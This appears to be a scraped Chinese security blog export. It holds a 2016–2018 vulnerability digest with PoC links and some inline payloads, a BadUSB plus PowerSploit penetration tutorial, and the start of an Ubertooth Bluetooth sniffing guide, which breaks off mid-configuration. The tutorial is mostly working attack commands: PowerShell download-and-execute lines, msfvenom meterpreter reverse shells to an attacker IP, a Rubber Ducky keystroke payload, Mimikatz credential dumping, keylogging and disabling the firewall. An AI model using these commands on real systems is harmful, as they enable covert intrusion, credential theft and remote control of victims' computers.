漏洞分析：https://mp.weixin.qq.com/s/-HuQA2KfGB_rAG4VasTUhQ POC：https://github.com/brianwrf/CVE-2018-2628 分析：http://www.freebuf.com/vuls/169420.html 分析：https://paper.seebug.org/584/ MSF模块：https://packetstormsecurity.com/files/148878/weblogic_deserialize.rb.txt 【20180410】SpringDataCommons RCE漏洞 CVE-2018-1270 漏洞公告：https://pivotal.io/security/cve-2018-1273 漏洞分析：https://xz.aliyun.com/t/2269https://mp.weixin.qq.com/s/bIY0PHvQEbNT2inhS5dZwg 【20180406】SpringMessaging RCE漏洞 CVE-2018-1270 描述：SPEL表达式注入。使用spring-messaging模块开放的STOMP协议的Websocket Broker服务存在漏洞。 分析复现：https://xz.aliyun.com/t/2252 官方公告：https://pivotal.io/security/cve-2018-1270 修复：需更新Spring框架到5.0.5、4.3.16及以上（4.3.15版本未修复，需要升级到4.3.16版本及以上） 补丁绕过：https://pivotal.io/security/cve-2018-1275 【20180328】Drupal代码执行漏洞（CVE-2018-7600） PoC：https://github.com/dreadlocked/Drupalgeddon2/blob/master/drupalgeddon2.rb 描述：Drupal 使用 # 开头的变量作为内部表达式使用的变量，但未考虑到用户请求中可构造该类型变量，在多个函数调用中可能导致任意代码执行漏洞。 影响：小于 7.58 的所有 7.* 版本、小于 8.5.1 的所有 8.* 版本、已停止维护的 6.* 版本 修复：7.* 升级到 7.58 https://www.drupal.org/project/drupal/releases/7.58 修复：8.* 升级到 8.5.1 https://www.drupal.org/project/drupal/releases/8.5.1 修复：6.* 和 8.3、8.4 已经停止维护，建议升级到 8.5.1 或 7.5.8 公告：https://www.drupal.org/sa-core-2018-002 【20180406】Windows提权 TotalMeltdown WindowsCPU补丁导致一个新的提权漏洞 【20180330】思科Cisco SmartInstallClient缓冲区溢出漏洞及多个严重漏洞CVE-2018-0171,默认口令CVE-2018-0150 漏洞发现者博客：https://embedi.com/blog/cisco-smart-install-remote-code-execution/ 思科安全公告：https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2 长亭预警：http://mp.weixin.qq.com/s/6KmpLlnsyiTKGu6GkCmXDg 同程预警：http://mp.weixin.qq.com/s/cMYUuGFmox5PK89fO_eR8w 探测PoC：https://github.com/Cisco-Talos/smi_check/blob/master/smi_check.py 协议特征：https://github.com/rapid7/metasploit-framework/commit/c67e407c9c5cd28d555e1c2614776e05b628749d Exploit: https://github.com/Sab0tag3d/SIET 另外还有一个默认口令的漏洞：https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-xesc 据说是 cisco/$un7zu 【20180329】Drupal核心远程代码执行 漏洞预警: Drupalgeddon2-Drupal核心远程代码执行 PoC: 暂无 【20180316】Ubuntu1604提权漏洞, 漏洞相关: CVE-2017-16995 讨论: https://news.ycombinator.com/item?id=16597800 描述: 2017年12月，Google P0团队发现4.14分支以后eBPF存在漏洞https://www.cvedetails.com/cve/CVE-2017-16995/。内核主线4.14之后版本都已经修复漏洞，但4.4分支也存在类似漏洞未修复。 Exploit: http://cyseclabs.com/exploits/upstream44.c 相关历史漏洞的修复: https://github.com/torvalds/linux/commit/95a762e2c8c942780948091f8f2a4f32fce1ac6f 相关历史漏洞: https://bugs.chromium.org/p/project-zero/issues/detail?id=1454&amp;desc=3 触发条件: CONFIG_BPF_SYSCALL 打开,可以调用bpf syscall /proc/sys/kernel/unprivileged_bpf_disabled 设置为0 漏洞分析: https://mp.weixin.qq.com/s/PgyKiEpGzNJFX6FwmJcR0A 漏洞分析: https://xianzhi.aliyun.com/forum/topic/2212 修复: echo “deb http://archive.ubuntu.com/ubuntu/ xenial-proposed restricted main multiverse universe” &gt; /etc/apt/sources.list &amp;&amp; apt update &amp;&amp; apt install linux-image-4.4.0-117-generic 【20180315】CredSSP MS-RDP漏洞？ 漏洞分析：https://mp.weixin.qq.com/s/7tKZeY23otlNLk7tJv-lfQ 【20180307】Adobe Acrobat ReaderPDF远程代码执行漏洞 新闻稿: https://www.secpulse.com/archives/69147.html 漏洞分析: https://www.talosintelligence.com/vulnerability_reports/TALOS-2017-0505 漏洞预警: https://cert.360.cn/warning/detail?id=33ec6051c0ca499106a3aa6168d853f5 【20180301】Memcache DDoS反射放大攻击 安全预警：https://cert.360.cn/warning/detail?id=c63eb87058834e37c7c112c35ef5f9fd 漏洞分析：基于Memcached分布式系统DRDoS拒绝服务攻击技术研究http://blog.csdn.net/microzone/article/details/79262549 漏洞描述：利用memcache 11211端口作为DRDoS放大器，可将流量放大五万倍左右。向未鉴权的Memcache中插入大量数据，并伪造源IP进行读取操作，从而进行反射放大攻击。 相关报道：https://thehackernews.com/2018/03/biggest-ddos-attack-github.html PoC: python -c “print ‘\\0\\x01\\0\\0\\0\\x01\\0\\0stats\\r\\n’” nc -nvvu x.x.x.x 11211 &gt;/tmp/null PoC: https://github.com/kxcode/snippet/blob/master/memcache-reflect.txt 【20180201】Adobe Flash 缓冲区溢出漏洞 CVE-2018-4878 描述：2月1日，Adobe官方发布了Adobe Flash Player系列产品的安全通告（APSA18-01），一个最新的Adobe Flash零日漏洞被发现针对韩国地区的人员发起攻击，该0day漏洞编号为CVE-2018-4878，目前最新版本28.0.0.137及其以前版本的Adobe Flash Player均受漏洞影响，Adobe官方将于2月5日发布漏洞补丁 CVE: CVE-2018-4878 PoC: https://github.com/vysec/CVE-2018-4878 PoC: https://github.com/anbai-inc/CVE-2018-4878 分析报告: https://mp.weixin.qq.com/s/zJm-mr5-U5sBHdc3Qlx_3Q 相关报道: CVE-2018-4878 (Flash Player up to 28.0.0.137) and Exploit Kits 【201802】Wordpress全版本DoS漏洞 CVE-2018-6389 漏洞影响范围: 全版本，官方没有发补丁 漏洞描述：漏洞是一个应用程序级别的 DoS攻击问题，该漏洞出现在load-scripts.php文件中，load-scripts.php文件是为WordPress管理员设计的，允许将多个JavaScript文件加载到一个请求中，通过技术分析发现可以在登录之前调用该函数来允许任何人调用它，并通过少量请求返回大数据，造成服务器资源消耗，从而导致DoS攻击。 PoC: https://github.com/WazeHell/CVE-2018-6389/blob/master/CVE-2018-6389.py PoC: CC攻击这个URL，https://example.com/wp-admin/load-scripts.php?c=1&amp;load[]=jquery-ui-core&amp;ver=4.9.1 load[]参数可以填如下值：eutil,common,wp-a11y,sack,quicktag,….(可参考github上的PoC) 【20180128】PHP的GD库DoS漏洞 分析文章：https://www.toutiao.com/i6514551846428738055/ 漏洞信息：https://nvd.nist.gov/vuln/detail/CVE-2018-5711 漏洞信息：https://bugs.php.net/bug.php?id=75571 影响范围：PHP 5&lt; PHP 5.6.33, PHP 7.0&lt;PHP 7.0.27, PHP 7.1&lt;PHP 7.1.13, PHP 7.2&lt;PHP 7.2.1 测试文章：https://m.toutiao.com/i6514551846428738055/ 【20180124】Electron 命令执行 【20180101】谷歌发现暴雪DNS Rebind漏洞 【20180124】SmartyPHP模板引擎命令执行RCE漏洞 分析文章：https://xianzhi.aliyun.com/forum/topic/1983 组件指纹：smarty_internal_runtime_codeframe.php 存在这个文件说明使用smarty 修复判断：如果文件内容没有str_replace('*/','* /',$_template-&gt;source-&gt;filepath)说明没有修复 扫描用例：http://smart-y.teaser.insomnihack.ch/console.php?id=*/phpinfo();/* 【20180123】Office命令执行漏洞 CVE-2018-0802 描述：CVE-2017-11882补丁的绕过 分析：http://www.freebuf.com/vuls/160386.html 【20180118】Libc Realpath缓冲区溢出漏洞（CVE-2018-1000001），Linux提权漏洞 影响范围：影响Redhat、Debian、Ubuntu、Suse等Linux发行版本，理论上Linux内核版本大于或等于2.6.36均受影响 参考文章：https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/ 参考文章：https://mp.weixin.qq.com/s/x69eDc8ke0wcUcwRdhsk4Q PoC: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c 【20180104】Intel等CPU存在边信道内存泄露漏洞: Meltdoan,Spectre Meltdown攻击: CVE-2017-5753、CVE-2017-5715 Spectre攻击: CVE-2017-5754 安天分析报告: 处理器A级漏洞Meltdown(熔毁)和Spectre(幽灵)分析 官方Paper: https://spectreattack.com/spectre.pdf 官方Paper: https://meltdownattack.com/meltdown.pdf 官方博客: https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html PoC: https://github.com/turbo/KPTI-PoC-Collection PoC: https://github.com/Eugnis/spectre-attack PoC: https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6#file-spectre-c 各厂商公告汇总: https://isc.sans.edu/diary/23193 各厂商补丁地址: https://github.com/hannob/meltdownspectre-patches 微软补丁: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV180002 微软补丁: https://portal.msrc.microsoft.com/zh-cn/security-guidance/releasenotedetail/858123b8-25ca-e711-a957-000d3a33cf99 Xen公告: http://xenbits.xen.org/xsa/advisory-254.html?from=timeline 补丁后续: Azure虚拟机打上Meltdown补丁更新后，真的被搞瘫痪了！ 相关文章: Intel回应CPU内核漏洞：别只盯着我们! ARM中枪，AMD躺枪 在线监测：http://xlab.tencent.com/special/spectre/spectre_check.html 缓解措施：http://mp.weixin.qq.com/s/Bdc58fRJO4nFzCHnO5WIYQ 后续报道：http://www.freebuf.com/news/160854.html 2017 【20171222】Weblogic WLS组件 XMLDecoder反序列化漏洞 CVE-2017-10271 近期Weblogic的一个RCE漏洞在野被爆发式利用，多用于植入挖矿程序。 近期大量WebLogic主机感染挖矿病毒 分析：https://www.ren-isac.net/public-resources/alerts/REN-ISAC_ADVISORY_Oracle_WebLogic_Vulnerability_Bitcoin_Miner_Attacks_20180105v1.pdf https://x.threatbook.cn/nodev4/vb4/waparticle?threatInfoID=271 官方补丁公告：Oracle 201710重要安全公告 XMLDecoder反序列化漏洞是一个历史漏洞，PoC：https://github.com/pwntester/XMLDecoder Weblogic wls-wsat 包中也存在这个反序列化漏洞，PoC：https://github.com/kxcode/snippet/blob/master/Weblogic-CVE-2017-10271.txt 【20171219】GoAhead服务器CGI存在LD_PRELOAD命令执行漏洞 CVE-2017-17562 影响范围：3.6.5以下版本的GoAhead，开启CGI脚本支持 漏洞描述：在初始化CGI脚本环境时，未限制用户参数中的环境变量名。该漏洞将影响所有开启了CGI脚本支持（动态链接可执行脚本文件）的GoAhead服务。通过传入恶意的LD_PRELOAD变量可以Hook服务器端的共享函数库，执行恶意动态链接对象。而且launchCgi方法会使用dup2()来处理stdin文件描述符，而它指向的是一个包含了POST请求body内容的临时文件。而Linux procfs文件系统的符号链接可以帮助我们直接引用stdin描述符，而它指向的就是我们所要找的临时文件。这样我们可以在Post Body中传入恶意Payload和相关构造器，来远程利用这个漏洞。 PoC：curl -X POST –data-binary @payload.so http://makemyday/cgi-bin/cgitest?LD_PRELOAD=/proc/self/fd/0 -i 漏洞分析：http://mp.weixin.qq.com/s/fDR1tVvMJwXTeOWphUQl1Q 漏洞分析：http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4282.html 【20171211】 Apache Synapse反序列化命令执行漏洞 ApacheSynapse 3.0.1之前的版本使用了CommonsCollection-3.2.1类库，受到CommonsCollection的反序列化漏洞影响，存在命令执行漏洞 https://mp.weixin.qq.com/s/RTRJcbkShIFiQlli_cF8Og 默认漏洞端口：1099，HTTP RMI服务 漏洞版本下载：http://synapse.apache.org/download.html POC: https://github.com/kxcode/snippet/blob/master/Synapse-Deserial 【20171130】大脏牛漏洞 - Linux提权 PoC：https://github.com/bindecy/HugeDirtyCowPOC https://medium.com/bindecy/huge-dirty-cow-cve-2017-1000405-110eca132de0 https://www.seebug.org/vuldb/ssvid-96908 影响Linux内核2.6.38~4.14 【20171127】Office Word命令执行漏洞 CVE-2017-11882 2017年11月14日，微软发布了11月的安全补丁更新，其中CVE-2017-11882是一个远程执行漏洞，通杀目前市面上的所有office版本及Windows操作系统(包括刚刚停止支持的Office 2007)。该漏洞的成因是EQNEDT32.EXE进程在读入包含MathType的ole数据时，在拷贝公式字体名称时没有对名称长度进行校验，从而造成栈缓冲区溢出，是一个非常经典的栈溢出漏洞。 漏洞分析：http://bobao.360.cn/learning/detail/4753.html 利用程序：https://github.com/embedi/CVE-2017-11882 【20171116】CouchDB远程代码执行漏洞 - 参数污染加管理员 官方公告：https://blog.couchdb.org/2017/11/14/apache-couchdb-cve-2017-12635-and-cve-2017-12636/ 漏洞博客：https://justi.cz/security/2017/11/14/couchdb-rce-npm.html 安全版本：2.1.1、1.7.0/1.7.1 CVE-2017-12635、CVE-2017-12636 相关历史漏洞：利用query server配置项执行命令 https://www.seebug.org/vuldb/ssvid-91597 【20171020】Discuz竞价排行XSS漏洞 /misc.php?mod=ranklist&amp;type=member 添加上榜宣言 &lt;img src=1 onerror=alert(1)&gt; /misc.php?mod=ranklist&amp;type=index 鼠标移动到当前用户头像处，触发XSS漏洞 补丁：https://gitee.com/ComsenzDiscuz/DiscuzX/ 【20171019】Apache Solr 7.0.1 - XML External Entity Expansion / Remote Code Execution Exploit：https://www.exploit-db.com/exploits/43009/ http://seclists.org/oss-sec/2017/q4/79 http://lucene.apache.org/solr/news.html 安全版本：6.6.2、7.1.0 【20170929】Discuz!X任意文件删除漏洞 补丁：https://gitee.com 影响：Discuz! X2.5、X3.2、X3.3、X3.4 【20170928】Spring Data Rest远程代码执行漏洞 分析：https://mp.weixin.qq.com/s/uTiWDsPKEjTkN6z9QNLtSA 修复：https://github.com/spring-projects/spring-data-rest/releases/tag/2.6.7.RELEASE 【20170920】Tomcat绕过安全限制PUT上传JSP文件，导致远程代码执行 分析：https://paper.seebug.org/399/ https://mailinglist-archive.mojah.be/varia-announce/2017-09/msg00013.php http://tomcat.apache.org/security-7.html#Apache_Tomcat_7.x_vulnerabilities 影响：7.0.0~7.0.81 利用：PUT /evil.jsp/ HTTP/1.1 【20170920】Wordpress SQLi、XSS等高危漏洞修复 https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ http://toutiao.secjia.com/wordpress-4-8-1-xss 【20170919】Apache Optionsbleed漏洞 https://blog.fuzzing-project.org/60-Optionsbleed-HTTP-OPTIONS-method-can-leak-Apaches-server-memory.html http://www.freebuf.com/vuls/148525.html 补丁：2.4.x 、 2.2.x http://www.apache.org/dist/httpd/CHANGES_2.4 安全版本：2.4.28 【20170908】 S2-053 Struts2 Freemarker标签远程代码执行 https://cwiki.apache.org/confluence/display/WW/S2-053 【20170907】S2-052 Struts2 Rest插件反序列化命令执行漏洞 https://cwiki.apache.org/confluence/display/WW/S2-052 分析：提交XML格式的恶意请求进行利用。 安全版本：2.3.34、2.5.13 【20170809】Office任意代码执行 CVE-2017-0199 在野利用：http://www.freebuf.com/news/143585.html 【20170613】CVE-2017-8464 Windows快捷方式任意代码执行漏洞 描述：本地用户或远程攻击者可以利用该漏洞生成特制的快捷方式，并通过可移动设备或者远程共享的方式导致远程代码执行。 利用条件：需要U盘自动播放才能发挥效果 影响范围： Windows 7 Windows 8.1 Windows RT 8.1 Windows 10 Windows Server 2008 Windows Server 2008 R2 Windows Server 2012 Windows Server 2012 R2 Windows Server 2016 漏洞文章: http://www.freebuf.com/news/143356.html 【20170512】永恒之蓝漏洞 MS17-010 CVE-2017-0144 描述：SMB远程命令执行漏洞。微软已于2017年3月14日发布MS17-010补丁，修复了“永恒之蓝”攻击的系统漏洞。 PoC: https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py NSA后门doublepulsar检测工具https://github.com/countercept/doublepulsar-detection-script 影响范围：Windows 2003、Windows 2003 R2、Windows XP、Windows Vista、Windows 7、Windows 8.1、Windows 10、Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 、 Windows Server 2012 R2、Windows Server 2016 【20170418】Fastjson反序列化漏洞 http://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/ https://lazydog.me/post/fastjson-JdbcRowSetImpl-rce-exploit.html 漏洞利用绕过：http://xia0yu.win/java/34.html 【20170401】Supervisord RPC服务端RCE漏洞（需认证） The XML-RPC server in supervisor before 3.0.1, 3.1.x before 3.1.4, 3.2.x before 3.2.4, and 3.3.x before 3.3.3 allows remote authenticated users to execute arbitrary commands via a crafted XML-RPC request, related to nested supervisord namespace lookups. https://www.exploit-db.com/exploits/42779/ https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html CVE-2017-11610 POC: https://github.com/kxcode/snippet/blob/master/Supervisord-RCE 2016 【201610】DirtyCow脏牛提权漏洞CVE-2016-5195 影响范围：Linux 内核 &gt;=2.6.22（2007 年发行）开始就受影响了，直到 2016 年 10 月 18 日才修复。 PoC: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs https://dirtycow.ninja/ 影响范围https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails 影响范围https://github.com/kcgthb/RHEL6.x-COW 【20160718】Shiro 1.2.4反序列化命令执行漏洞 描述：Cookie中rememberMe字段使用硬编码的AES加密，并且会被反序列化。所以可以被篡改为反序列化Gadget进行命令执行。 漏洞利用：需要根据目标的环境选择相应的Gadget，目标环境如有&quot;commons-collections4:4.0&quot;的漏洞类库，则可以用ysoserial的CommonsCollections2 payload直接打。但是如果目标环境是&quot;commons-collections:3.1、3.2.1&quot;类库的话，必须用JRMPClient中转一下，攻击者服务器监听JRMPListener再用CommonsCollection6等payload打。 利用分析：对于commons-collections3.2.1环境，如果直接打commonscollection的payload，会报错： java.lang.ClassNotFoundException: Unable to load ObjectStreamClass [[Lorg.apache.commons.collections.Transformer;: static final long serialVersionUID = -4803604734341277543L;]: 报错的原因是因为：Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。 漏洞分析：直接利用CommonsCollection执行 https://paper.seebug.org/shiro-rememberme-1-2-4/ 漏洞分析：利用JRMPListener执行 http://www.yilan.io/article/5b4dce6512d8c64b05ffd540 官方issue：https://issues.apache.org/jira/browse/SHIRO-550 漏洞延伸：https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw","link":"/Vulnerabilities/index.html"}],"posts":[{"title":"PowerSploit与Badusb联合进行渗透","text":"0x00 PowerShell 介绍 Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和编写者可以利用，NET Framework的强大功能。 ​ 它引入了许多非常有用的新概念，从而进一步扩展了您在Windows命令提示符和Windows Script Host 环境中获得的知识和创建的脚本。 ​ PowerShell诞生于vista时代，在系统中有着强大的功能，可以方便的调用Windows API等等。很多多人忽略了他，但其是一座待开发的金矿，在后渗透测试中产给我们带来意外的惊喜。 0x01 PowerShell执行策略输入：get-executionpolicy 查看现用执行策略 Restricted—默认的设置，不允许任何script AllSigned—只能运行经过数字签名的script RemoteSigned—运行本地的script不需要数字签名，但是要运行从网络上下载的script就必须要有数字签名。 Unrestricted—允许所有的script 修改策略：set-executionpolicy [策略名称] 测试： “$PSVersionTable.PSVersion”写入test.psl 如果脚本成功执行就是打印出这句话 执行： .\\test.ps1 如果是普通用户的话会被禁用 绕过： powershell.exe –ExecutionPolicy Bypass –file .\\test.ps1 注意：想要修改执行策略需要超级管理员权限，因此对于内网渗透提权是一个打击。但是可以绕过执行策略限制。 本地权限绕过执行： Powershell.exe –ExecutionPolicy Bypass –File .\\xxx.ps1 本地隐藏权限绕过执行脚本： PowerShell.exe –ExecutionPolicy Bypass –Nologo –NonInteractive –Noprofile –WindowStyle Hidden –File xxx.ps1 直接用IEX下载远程的PS1脚本回来权限绕过执行： Powershell “IEX(New-ObjectNet.WebClient).DownloadString(‘https://is.gd/oeoFul’)”;Invoke-Mimikatz –dumpCreds” 0x02 PowerSploit Powersploit**是一款基于powershell的后渗透（Post-exploitation）框架，集成大量渗透相关模块和功能。** Github地址：[powersploit](https://github.com/PowerShellMafia/PowerSploit) 将下载下来的powersploit文件夹内的所有文件（不含powersploit文件夹）拷贝到/var/www/html/ 目录下 模块介绍 codexecution 在目标主机执行代码 ScriptModification 在目标主机上创建或修改脚本 Persistence 后门脚本（持续性控制） AntivirusBypass 发现杀软查杀特征 Exfiltration 目标主机上的信息收集工具 Mayhem 蓝屏等破环形脚本 Recon 以目标主机为跳板进行内网信息侦查 功能介绍(1)Invoke-Shellcode将shellcode插入选择的进程ID或本地PowerShell中 IEX (New-Object Net.WebClient).DownloadString(“http://IP/CodeExecution/Invoke–Shellcode.ps1”) 1.攻击者生成payload反弹木马 msfvenom –p windows/meterpreter/reverse_https lhost=192.168.98.94 lport=5555 –f powershell –o /var/www/html/payload 2.监听本机 5555 端口 使用msf exploit/multi/handler模块即可 3.下载相应脚本 IEX (New-Object Net.WebClient).DownloadString(“http://192.168.98.94/CodeExecution/Invoke-Shellcode.ps1”) 4.下载反弹木马 IEX (New-Object Net.Webclient).DownloadString(“http://192.168.98.94/test”) 5.在powershell下运行 Invoke-Shellcode -Shellcode($buf) 完成以上三个命令得到一个meterpreter后渗透会话 注入进程： 1.使用 PS 或者 Get-Process 来获取当前进程 ps | Get-Process 2.启动一个记事本，并把他设置为隐藏的 Start-Process C:\\Windows\\system32\\notepad.exe –windowStyle Hidden 3.插入进程中,同样反弹成功 Invoke-Shellcode -ProcessID PID -Shellcode($buf) –Force (2)Invoke-DLLinjection .dll注入1.下载相应脚本 IEX (New-Object Net.WebClient).DownloadString(“http://192.168.98.94/CodeExecution/Invoke-DllInjection.ps1”) 2.生成反弹dll文件 2.msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.98.94 lport=5555 -f dll -o /var/www/html/test.dll 3.不可以使用powershell进行下载，之后可以使用badusb进行下载执行 IEX (New-Object Net.WebClient).DownloadString(“http://192.168.98.94/test.dll”) 4.注入进程，切换payload，开始监听，成功反弹 Invoke-DllInjection -ProcessID PID -Dll .\\test.dll (3)Invoke-Portscan端口扫描1.下载相应脚本 IEX (New-Object Net.WebClient).DownloadString(“http://192.168.98.94/Recon/Invoke-Portscan.ps1”) 2.进行端口扫描 Invoke-Portscan -Hosts 192.168.98.95.1,192.168.98.96 -Ports “80,22,3389” (4)Invoke-Mimikatz Mimikatz1.下载相应脚本 IEX (New-Object Net.WebClient).DownloadString(“http://192.168.98.94/Exfiltration/Invoke-Mimikatz.ps1”) 2.读取密码（需要管理员权限） Invoke-Mimikat –DumpCreds (5)Get-Keystrokes 键盘记录1.下载相应脚本 IEX (New-Object Net.WebClient).DownloadString(“http://192.168.98.94/Exfiltration/Get-Keystrokes.ps1”) 2.键盘记录（记录十分详细，连鼠标点击也可以记录，需要管理员权限） Get-Keystrokes –LogPath + &lt;保存位置&gt; (6)Invoke-NinjaCopy 文件复制1.下载相应的脚本 IEX (New-Object Net.WebClient).DownloadString(“http://192.168.98.94/Exfiltration/Invoke-NinjaCopy.ps1”) 2.复制文件（需要管理员权限，一开机就加锁的sam文件也可以复制） Invoke-NinjaCopy –Path “文件目录”-LocalDestination “复制目录” 0x03 HID AttackHID**是Human Interface Device的缩写，例如键盘、鼠标与等。不过HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。** 由于电脑对这类设备缺少严格的检测措施，只是简单的识别设备类型，就允许设备对电脑进行各项操作。所以，通过修改篡改设备反馈信息，就可以很轻松的让电脑将其他设备误认为HID设备，从而获取控制权限。尤其是USB和蓝牙这类即插即用接口出现，导致HID Attack成为重要方式。例如，Bad USB就是USB类攻击的典型代表。 通过硬件直接插入对方电脑，让对方电脑执行代码，达到干扰、控制主机或者窃取信息等目的。 0x04 Badusb​ 一般来说，USB 设备有两种，一种是 Host，比如电脑，可以去读取其他 USB 设备的数据，另外一种是 Device，比如键盘鼠标优盘。所以从根本上来说，制作一个 Bad USB 核心要求只有一个，就是自身可以作为 USB Device。 BadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。 U盘由芯片控制器和闪存两部分组成，芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。 BadUSB就是通过对U盘的固件进行逆向重新编程，相当于改写了U盘的操作系统而进行攻击的。 USB协议漏洞: 现在的USB设备很多，比如音视频设备、摄像头等，因此要求系统提供最大的兼容性，甚至免驱；所以在设计USB标准的时候没有要求每个USB设备像网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备具有多个输入输出设备的特征。这样就可以通过重写U盘固件，伪装成一个USB键盘，并通过虚拟键盘输入集成到U盘固件中的指令和代码而进行攻击。 0x05 常见的Badusb1.hak5的USB RUBBER DUCKYhttps://hakshop.com/products/usb-rubber-ducky-deluxe 2.Digispark(Attiny85微型) USB接口开发板) 3.国内大多是采用的Teensy 或者Arduino Leonardo，淘宝上还有厂商制作的U盘模样的Arduino Leonardo 0x06 DigisparkDigispark**是一个基于ATTINY85微控制器的USB开发板，体积小且价钱便宜，功能方面则没有Arduino般强大。代码与Arduino大同小异，更可贵的是使用Arduino IDE来开发。淘宝上直接搜索Digispark就能看到了，价格在7-10元不等。** 配置环境百度云链接： https://pan.baidu.com/s/1MmbIlSmIL3wGmaRO4RPjTA 密码:qaqs Digispark官方教程 http://digistump.com/wiki/digispark/tutorials/connecting Arduino IDE： https://www.arduino.cc/en/Main/Software Digispark的驱动： https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip payload hak5的USB-Rubber-Ducky： https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads Digispark翻译脚本： https://github.com/toxydose/Duckyspark 1.安装驱动Digistump.Drivers目录下 32位系统安装 DPinst.exe 64位系统安装 DPinst64.exe 注意下图提示框的选择： 2.安装IDE解压缩 arduino-1.8.3-windows-IDE.zip 拷贝到C:\\Program Files\\arduino-1.8.3目录下 运行：arduino.exe 3.设置arduino第一步： 第二步：填写附加开发板管理器网址：http://digistump.com/package_digistump_index.json 第三步 打开开发板管理器 等待下载完 然后在“类型”中选择“贡献” 点击安装Digistump AVR boards by Digistump 等待下载的完成 出现下图时表示安装完成了： 工具-开发板- 选择：Digispark(Default -16.5Mhz):-如下图 然后如下图操作 项目-加载库-添加一个.zip库……（此处无法截图） 然后将Keyboard.zip载入 0x07 HID Attack 测试1.使用hak5-USB RUBBER DUCKY payload进行测试 2.使用PowerSploit进行联合测试 1.创建一个test.txt文件，内容如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253DELAY 5000GUI rDELAY 500STRING cmd.exe /T:01 /K mode CON: COLS=16 LINES=1DELAY 400ENTERDELAY 500ENTERDELAY 400STRING powershellDELAY 500ENTERDELAY 500STRING IEX(New-Object Net.Webclient).DownloadString(“http://192.168.99.135/CodeExecution/Invoke-Shellcode.ps1”)//地址是kali的DELAY 500ENTERDELAY 500STRING IEX (New-Object Net.Webclient).DownloadString(“http://192.168.99.135/xpy”)DELAY 500ENTERDELAY 500STRING Invoke-Shellcode -Shellcode ($buf)DELAY 500ENTERDELAY 2000ENTERDELAY 5000 2.运行payload转化脚本python Duckyspark_translator.py e:\\test1.txt e:\\powershell 3.打开 生成的powershell.ino 文件将其内容拷贝到arduino 中编译 4.当编译没有错误时 插入badusb 然后点击“上传”（如下图） 5.监听相应端口1234567msfconsole use exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.99.135 set lport 5555 run 6.msfvenom生成一个powershell脚本：1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.99.135 LPORT=5555 -f powershell -o /var/www/html/test 7.然后主机插入badusb 反弹成功3.使用自己搭建的ftp等互联网服务进行渗透（1）用管理员权限打开cmd，进入用户目录，关闭防火墙。注1：如果用户防火墙开着在下载文件的时候会弹出提示，这样操作就会失败。 注2：如果用户装了安全软件如360这种，关闭防火墙的时候会有告警弹出，也会失败。 cd %USERPROFILE% netsh firewall set opmode mode=disable profile =ALL （2）通过执行ftp命令txt文件进行利用ftp -s:ftp.txt 4. 利用其他小工具、更加复杂的命令等你可以想到的骚思路来进行渗透1.tv_dump.exe 获取teamviewer用户名密码2.mimikatz | WebBrowserPassView 等3.包括一些ukey接口以及终端服务机器等ps： 1.win7的补丁可能破坏了powershell，导致崩溃，若崩溃，就将tcp协议换为http协议，再进行回连。 2.注意回连不成功，可能是没有打开apache服务器，没开SSH。 3.用Arduino打开时，一个文件夹下只能有一个ino文件，否则编译时会出错。 4.用python 3.多的版本运行脚本 5.在该脚本路径下敲cmd运行脚本 6.txt放在c盘之外再编译成powershell脚本 7.编译时去掉注释","link":"/2018/06/17/IOT/PowerSploit%E4%B8%8EBadusb%E8%81%94%E5%90%88%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/"},{"title":"使用Ubertooth one扫描嗅探低功耗蓝牙","text":"0x00 本机环境1234Mac osx 10.15.5VMware Fusion 11.5.1Ubuntu 18.04Ubertooth One 0x01 环境搭建1. 安装lib库1234apt-get install python-software-propertiesadd-apt-repository ppa:pysideapt-get updateapt-get install libnl-3-dev libusb-1.0-0-dev pyside-tools 2. 安装libbtbb12345678wget https://github.com/greatscottgadgets/libbtbb/archive/2015-09-R2.tar.gz -O libbtbb-2015-09-R2.tar.gztar xf libbtbb-2015-09-R2.tar.gzcd libbtbb-2015-09-R2mkdir buildcd buildcmake ..makesudo make install 3. 安装ubertooth1sudo apt-get install ubertooth 报错安装： 1sudo apt-get install pkg-config 4. 安装wireshark1sudo apt-get install wireshark 5. 安装kismeta. 直接安装1sudo apt-get install ckermit 在~中创建.kermrc，然后输入如下配置信息： 1234567891011set line 